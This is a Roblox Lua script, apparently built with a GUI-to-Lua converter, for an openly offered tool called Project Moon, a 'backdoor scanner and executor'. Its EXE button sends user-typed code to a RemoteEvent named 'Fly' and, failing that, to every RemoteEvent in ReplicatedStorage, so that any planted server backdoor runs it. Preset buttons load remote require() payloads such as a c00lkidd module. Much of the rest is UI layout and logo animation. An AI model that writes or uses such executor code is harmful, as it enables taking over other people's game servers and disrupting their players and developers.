--[[
    Project Moon is a backdoor scanner and
    backdoor Executor
    If there is a backdoor,it executes,if
    there is not,it doesn't.
    Report bugs VIA dc server
]]--

-- Gui to Lua
-- Version: 3.2

-- Instances:

local ProjectMoonPM = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local EXEName = Instance.new("TextLabel")
local logo = Instance.new("ImageLabel")
local executor = Instance.new("TextButton")
local settings = Instance.new("TextButton")
local Executor = Instance.new("Frame")
local TextBox = Instance.new("TextBox")
local EXE = Instance.new("TextButton")
local CLEAR = Instance.new("TextButton")
local LOAD = Instance.new("TextButton")
local scripts = Instance.new("ScrollingFrame")
local r6 = Instance.new("TextButton")
local c00l = Instance.new("TextButton")
local UIListLayout = Instance.new("UIListLayout")
local ScrollingFrame = Instance.new("ScrollingFrame")
local TextLabel = Instance.new("TextLabel")
local Settings = Instance.new("Frame")
local ssssssssssssssssssssss = Instance.new("TextLabel")
local ssss = Instance.new("TextLabel")
local settings_2 = Instance.new("TextButton")

--Properties:

ProjectMoonPM.Name = "ProjectMoonPM"
ProjectMoonPM.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ProjectMoonPM.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ProjectMoonPM.ResetOnSpawn = false

main.Name = "main"
main.Parent = ProjectMoonPM
main.BackgroundColor3 = Color3.fromRGB(216, 216, 216)
main.BorderColor3 = Color3.fromRGB(0, 0, 0)
main.BorderSizePixel = 0
main.Position = UDim2.new(0.30709219, 0, 0.267175585, 0)
main.Size = UDim2.new(0, 463, 0, 313)

EXEName.Name = "EXEName"
EXEName.Parent = main
EXEName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
EXEName.BorderColor3 = Color3.fromRGB(0, 0, 0)
EXEName.BorderSizePixel = 0
EXEName.Position = UDim2.new(0.0604751632, 0, 0, 0)
EXEName.Size = UDim2.new(0, 435, 0, 30)
EXEName.Font = Enum.Font.SourceSans
EXEName.Text = "Project Moon -  Project Stigma Ultimate Revival"
EXEName.TextColor3 = Color3.fromRGB(0, 0, 0)
EXEName.TextSize = 14.000
EXEName.TextXAlignment = Enum.TextXAlignment.Left

logo.Name = "logo"
logo.Parent = main
logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
logo.BorderColor3 = Color3.fromRGB(0, 0, 0)
logo.BorderSizePixel = 0
logo.Size = UDim2.new(0, 28, 0, 30)
logo.Image = "rbxassetid://7102117818"

executor.Name = "executor"
executor.Parent = main
executor.BackgroundColor3 = Color3.fromRGB(224, 225, 225)
executor.BorderColor3 = Color3.fromRGB(0, 0, 0)
executor.BorderSizePixel = 0
executor.Position = UDim2.new(0, 0, 0.0958466455, 0)
executor.Size = UDim2.new(0, 79, 0, 22)
executor.Font = Enum.Font.SourceSans
executor.Text = "Executor"
executor.TextColor3 = Color3.fromRGB(0, 0, 0)
executor.TextSize = 14.000

settings.Name = "settings"
settings.Parent = main
settings.BackgroundColor3 = Color3.fromRGB(224, 225, 225)
settings.BorderColor3 = Color3.fromRGB(0, 0, 0)
settings.BorderSizePixel = 0
settings.Position = UDim2.new(0.170626357, 0, 0.0958466455, 0)
settings.Size = UDim2.new(0, 79, 0, 22)
settings.Font = Enum.Font.SourceSans
settings.Text = "Settings"
settings.TextColor3 = Color3.fromRGB(0, 0, 0)
settings.TextSize = 14.000

Executor.Name = "Executor"
Executor.Parent = main
Executor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Executor.BorderColor3 = Color3.fromRGB(0, 0, 0)
Executor.BorderSizePixel = 0
Executor.Position = UDim2.new(0, 0, 0.166134179, 0)
Executor.Size = UDim2.new(0, 463, 0, 261)

TextBox.Parent = Executor
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BorderColor3 = Color3.fromRGB(94, 94, 94)
TextBox.BorderSizePixel = 2
TextBox.Position = UDim2.new(0.0202702694, 0, 0.0241935477, 0)
TextBox.Size = UDim2.new(0, 277, 0, 192)
TextBox.ClearTextOnFocus = false
TextBox.Font = Enum.Font.SourceSans
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextSize = 14.000
TextBox.TextWrapped = true
TextBox.TextXAlignment = Enum.TextXAlignment.Left
TextBox.TextYAlignment = Enum.TextYAlignment.Top

EXE.Name = "EXE"
EXE.Parent = Executor
EXE.BackgroundColor3 = Color3.fromRGB(226, 226, 226)
EXE.BorderColor3 = Color3.fromRGB(94, 94, 94)
EXE.BorderSizePixel = 2
EXE.Position = UDim2.new(0.645438075, 0, 0.0241935402, 0)
EXE.Size = UDim2.new(0, 52, 0, 62)
EXE.Font = Enum.Font.SourceSans
EXE.Text = "EXE"
EXE.TextColor3 = Color3.fromRGB(0, 0, 0)
EXE.TextSize = 14.000

CLEAR.Name = "CLEAR"
CLEAR.Parent = Executor
CLEAR.BackgroundColor3 = Color3.fromRGB(226, 226, 226)
CLEAR.BorderColor3 = Color3.fromRGB(94, 94, 94)
CLEAR.BorderSizePixel = 2
CLEAR.Position = UDim2.new(0.645438075, 0, 0.25886786, 0)
CLEAR.Size = UDim2.new(0, 52, 0, 59)
CLEAR.Font = Enum.Font.SourceSans
CLEAR.Text = "CLEAR"
CLEAR.TextColor3 = Color3.fromRGB(0, 0, 0)
CLEAR.TextSize = 14.000

LOAD.Name = "LOAD"
LOAD.Parent = Executor
LOAD.BackgroundColor3 = Color3.fromRGB(226, 226, 226)
LOAD.BorderColor3 = Color3.fromRGB(94, 94, 94)
LOAD.BorderSizePixel = 2
LOAD.Position = UDim2.new(0.645438075, 0, 0.48790288, 0)
LOAD.Size = UDim2.new(0, 52, 0, 70)
LOAD.Font = Enum.Font.SourceSans
LOAD.Text = "LOAD"
LOAD.TextColor3 = Color3.fromRGB(0, 0, 0)
LOAD.TextSize = 14.000

scripts.Name = "scripts"
scripts.Parent = Executor
scripts.Active = true
scripts.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scripts.BorderColor3 = Color3.fromRGB(94, 94, 94)
scripts.BorderSizePixel = 2
scripts.Position = UDim2.new(0.797297299, 0, 0.0241935477, 0)
scripts.Size = UDim2.new(0, 84, 0, 192)

r6.Name = "r6"
r6.Parent = scripts
r6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
r6.BorderColor3 = Color3.fromRGB(94, 94, 94)
r6.BorderSizePixel = 2
r6.Size = UDim2.new(0, 70, 0, 35)
r6.Font = Enum.Font.SourceSans
r6.Text = "R6.txt"
r6.TextColor3 = Color3.fromRGB(0, 0, 0)
r6.TextSize = 14.000

c00l.Name = "c00l"
c00l.Parent = scripts
c00l.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
c00l.BorderColor3 = Color3.fromRGB(94, 94, 94)
c00l.BorderSizePixel = 2
c00l.Size = UDim2.new(0, 70, 0, 35)
c00l.Font = Enum.Font.SourceSans
c00l.Text = "C00lgui.txt"
c00l.TextColor3 = Color3.fromRGB(0, 0, 0)
c00l.TextSize = 14.000

UIListLayout.Parent = scripts
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

ScrollingFrame.Parent = Executor
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BorderColor3 = Color3.fromRGB(94, 94, 94)
ScrollingFrame.BorderSizePixel = 2
ScrollingFrame.Position = UDim2.new(0.0194384456, 0, 0.785440624, 0)
ScrollingFrame.Size = UDim2.new(0, 341, 0, 49)

TextLabel.Parent = ScrollingFrame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(8.94943639e-08, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 289, 0, 18)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = ""
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

Settings.Name = "Settings"
Settings.Parent = main
Settings.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Settings.BorderColor3 = Color3.fromRGB(0, 0, 0)
Settings.BorderSizePixel = 0
Settings.Position = UDim2.new(0, 0, 0.166134179, 0)
Settings.Size = UDim2.new(0, 463, 0, 261)
Settings.Visible = false

ssssssssssssssssssssss.Name = "ssssssssssssssssssssss"
ssssssssssssssssssssss.Parent = Settings
ssssssssssssssssssssss.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ssssssssssssssssssssss.BackgroundTransparency = 1.000
ssssssssssssssssssssss.BorderColor3 = Color3.fromRGB(0, 0, 0)
ssssssssssssssssssssss.BorderSizePixel = 0
ssssssssssssssssssssss.Size = UDim2.new(0, 435, 0, 30)
ssssssssssssssssssssss.Font = Enum.Font.SourceSans
ssssssssssssssssssssss.Text = "Credits:VOIDERTHEDESTROYER"
ssssssssssssssssssssss.TextColor3 = Color3.fromRGB(0, 0, 0)
ssssssssssssssssssssss.TextSize = 14.000
ssssssssssssssssssssss.TextXAlignment = Enum.TextXAlignment.Left

ssss.Name = "ssss"
ssss.Parent = Settings
ssss.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ssss.BackgroundTransparency = 1.000
ssss.BorderColor3 = Color3.fromRGB(0, 0, 0)
ssss.BorderSizePixel = 0
ssss.Position = UDim2.new(0, 0, 0.0881226063, 0)
ssss.Size = UDim2.new(0, 435, 0, 30)
ssss.Font = Enum.Font.SourceSans
ssss.Text = "Executes on backdoor"
ssss.TextColor3 = Color3.fromRGB(0, 0, 0)
ssss.TextSize = 14.000
ssss.TextXAlignment = Enum.TextXAlignment.Left

settings_2.Name = "settings"
settings_2.Parent = main
settings_2.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
settings_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
settings_2.BorderSizePixel = 0
settings_2.Position = UDim2.new(0.902807772, 0, 0, 0)
settings_2.Size = UDim2.new(0, 45, 0, 30)
settings_2.Font = Enum.Font.SourceSans
settings_2.Text = "X"
settings_2.TextColor3 = Color3.fromRGB(255, 0, 0)
settings_2.TextSize = 14.000

-- Scripts:

local function QVPCD_fake_script() -- executor.LocalScript 
	local script = Instance.new('LocalScript', executor)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Executor.Visible = true
		script.Parent.Parent.Settings.Visible = false
	end)
end
coroutine.wrap(QVPCD_fake_script)()
local function LZSC_fake_script() -- settings.LocalScript 
	local script = Instance.new('LocalScript', settings)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Executor.Visible = false
		script.Parent.Parent.Settings.Visible = true
	end)
end
coroutine.wrap(LZSC_fake_script)()
local function PPITQGW_fake_script() -- EXE.LocalScript 
	local script = Instance.new('LocalScript', EXE)

	local rs = game:GetService("ReplicatedStorage")
	local button = script.Parent
	local box = script.Parent.Parent.TextBox
	button.MouseButton1Click:Connect(function()
		local code = box.Text
	
		if code == "" or code == "-- Ready to execute" then
			return
		end
	
		local rs = game:GetService("ReplicatedStorage")
		local backdoor = rs:FindFirstChild("Fly")
	
		local success = false
		if backdoor and backdoor:IsA("RemoteEvent") then
			success = pcall(function()
				backdoor:FireServer(code)
			end)
		end
	
		if not success then
			for _, v in pairs(rs:GetChildren()) do
				if v:IsA("RemoteEvent") then
					task.spawn(function()
						v:FireServer(code)
					end)
				end
			end
		end
	end)
end
coroutine.wrap(PPITQGW_fake_script)()
local function NCAB_fake_script() -- CLEAR.LocalScript 
	local script = Instance.new('LocalScript', CLEAR)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.TextBox.Text = ""
	end)
end
coroutine.wrap(NCAB_fake_script)()
local function IFYD_fake_script() -- LOAD.LocalScript 
	local script = Instance.new('LocalScript', LOAD)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.ScrollingFrame.TextLabel.Text = "Welcome to Project Moon,user.Have fun"
		local StigmanFroud = Instance.new("ScreenGui")
		local trajectory = Instance.new("ImageLabel")
		local R = Instance.new("ImageLabel")
		local Earth = Instance.new("ImageLabel")
		local Green = Instance.new("ImageLabel")
	
		StigmanFroud.Name = "Stigman Froud"
		StigmanFroud.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
		StigmanFroud.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		StigmanFroud.DisplayOrder = 999
		StigmanFroud.ResetOnSpawn = false
	
		trajectory.Name = "trajectory"
		trajectory.Parent = StigmanFroud
		trajectory.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		trajectory.BackgroundTransparency = 1
		trajectory.Position = UDim2.new(0.45430705, 0, 0.430432826, 0)
		trajectory.Size = UDim2.new(0, 110, 0, 110)
		trajectory.Image = "rbxassetid://7102118272"
		trajectory.SliceScale = 3
	
		R.Name = "R"
		R.Parent = StigmanFroud
		R.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		R.BackgroundTransparency = 1
		R.Position = UDim2.new(0.45430705, 0, 0.430432826, 0)
		R.Size = UDim2.new(0, 110, 0, 110)
		R.ZIndex = 3
		R.Image = "rbxassetid://7102117818"
		R.SliceScale = 3
	
		Earth.Name = "Earth"
		Earth.Parent = R
		Earth.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Earth.BackgroundTransparency = 1
		Earth.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Earth.BorderSizePixel = 0
		Earth.Position = UDim2.new(0.404999346, 0, 0.406818181, 0)
		Earth.Size = UDim2.new(0, 20, 0, 20)
		Earth.ZIndex = 4
		Earth.Image = "rbxassetid://78137783929126"
	
		Green.Name = "Green"
		Green.Parent = StigmanFroud
		Green.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Green.BackgroundTransparency = 1
		Green.BorderColor3 = Color3.fromRGB(0, 0, 0)
		Green.BorderSizePixel = 0
		Green.Position = UDim2.new(0.00499999989, 0, 0.824999988, 0)
		Green.Size = UDim2.new(0, 110, 0, 110)
		Green.ZIndex = 6
		Green.Image = "rbxassetid://75554667916597"
		Green.ImageTransparency = 1
	
		-- Main logo animation
		task.spawn(function()
			trajectory:TweenPosition(
				UDim2.new(0.451, 0, 0.395, 0),
				"Out",
				"Linear",
				0.4,
				false
			)
	
			task.wait(3)
	
			trajectory:TweenPosition(
				UDim2.new(0.005, 0, 0.619, 0),
				"Out",
				"Sine",
				0.7,
				false
			)
	
			while StigmanFroud.Parent do
				task.wait(0.01)
				trajectory.Rotation += 0.3
			end
		end)
	
		-- Earth orbit
		task.spawn(function()
			local Angle = 0
			local AngleIncrement = 0.02
			local OriginPos = Earth.Position
			local Distance = 55
	
			while StigmanFroud.Parent do
				task.wait()
	
				Angle += AngleIncrement
	
				local dirX = math.cos(Angle)
				local dirY = math.sin(Angle)
	
				Earth.Position =
					OriginPos + UDim2.new(
						0, dirX * Distance,
						0, dirY * Distance
					)
			end
		end)
	
		-- Main R animation
		task.spawn(function()
			R:TweenPosition(
				UDim2.new(0.451, 0, 0.395, 0),
				"Out",
				"Linear",
				0.4,
				false
			)
	
			task.wait(3)
	
			R:TweenPosition(
				UDim2.new(0.005, 0, 0.619, 0),
				"Out",
				"Sine",
				0.7,
				false
			)
		end)
	
		-- Green flashing effect
		task.spawn(function()
			local TweenService = game:GetService("TweenService")
	
			task.wait(2)
	
			while StigmanFroud.Parent do
				local fadeIn = TweenService:Create(
					Green,
					TweenInfo.new(0.5),
					{ImageTransparency = 0}
				)
				fadeIn:Play()
				task.wait(0.3)
	
				local fadeOut = TweenService:Create(
					Green,
					TweenInfo.new(0.5),
					{ImageTransparency = 1}
				)
				fadeOut:Play()
				task.wait(0.3)
	
				local fadeIn2 = TweenService:Create(
					Green,
					TweenInfo.new(0.5),
					{ImageTransparency = 0}
				)
				fadeIn2:Play()
				task.wait(0.3)
	
				local fadeOut2 = TweenService:Create(
					Green,
					TweenInfo.new(0.5),
					{ImageTransparency = 1}
				)
				fadeOut2:Play()
				task.wait(4)
			end
		end)
	
		-- Green logo movement
		task.spawn(function()
			Green:TweenPosition(
				UDim2.new(0.451, 0, 0.395, 0),
				"Out",
				"Linear",
				0.4,
				false
			)
	
			task.wait(3)
	
			Green:TweenPosition(
				UDim2.new(0.005, 0, 0.619, 0),
				"Out",
				"Sine",
				0.7,
				false
			)
		end)
	
		print("Stigma logo loaded!")
	
	end)
end
coroutine.wrap(IFYD_fake_script)()
local function ROSIO_fake_script() -- r6.thescripfrorr6 
	local script = Instance.new('LocalScript', r6)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.TextBox.Text = [[
	require(3436957371):r6("user")
	]]
	end)
	
end
coroutine.wrap(ROSIO_fake_script)()
local function AYIGA_fake_script() -- c00l.thescripfrorc00l 
	local script = Instance.new('LocalScript', c00l)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.TextBox.Text = [[
		require(14125553864):Fire("user","c00lkidd")
	]]
	end)
	
end
coroutine.wrap(AYIGA_fake_script)()
local function ECYHDM_fake_script() -- main.LocalScript 
	local script = Instance.new('LocalScript', main)

	frame = script.Parent.Parent.main
	frame.Draggable = true
	frame.Active = true
	frame.Selectable = true
end
coroutine.wrap(ECYHDM_fake_script)()
local function KERF_fake_script() -- settings_2.LocalScript 
	local script = Instance.new('LocalScript', settings_2)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Executor.Visible = false
		script.Parent.Parent.Settings.Visible = true
	end)
end
coroutine.wrap(KERF_fake_script)()
